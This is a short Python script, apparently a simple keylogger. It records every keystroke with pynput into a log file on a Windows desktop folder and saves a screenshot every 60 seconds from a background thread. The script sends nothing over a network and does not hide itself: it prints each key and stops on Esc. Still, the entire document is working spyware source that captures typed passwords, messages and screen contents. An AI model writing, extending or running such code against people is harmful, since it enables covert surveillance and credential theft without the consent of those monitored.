from pynput.keyboard import Key, Listener
import threading
import time
import pyautogui

keys = []
count = 0


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(f"{key} is pressed")
    if count > 10:
        count = 0
        write_file(keys)
        keys = []


def on_release(key):
    if key == Key.esc:
        return False


def take_screenshot():
    while True:
        time.sleep(60)
        snapshot = pyautogui.screenshot()
        file_name = f"C:\\Users\\MITTAL\\Desktop\\screenshots\\{str(time.time())}" + ".png"
        snapshot.save(file_name)


def write_file(keys):
    with open("C:\\Users\\MITTAL\\Desktop\\screenshots\\log.txt", 'a') as fopen:
        for k in keys:
            replace_quote = str(k).replace("'", "")
            if replace_quote.find("space") > 0:
                fopen.write(" ")
            elif replace_quote.find("enter") > 0:
                fopen.write("\n")
            elif replace_quote.find("Key") == -1:
                fopen.write(replace_quote)


t1 = threading.Thread(target=take_screenshot, args=())
t1.start()
with Listener(on_press, on_release) as listener:
    listener.join()
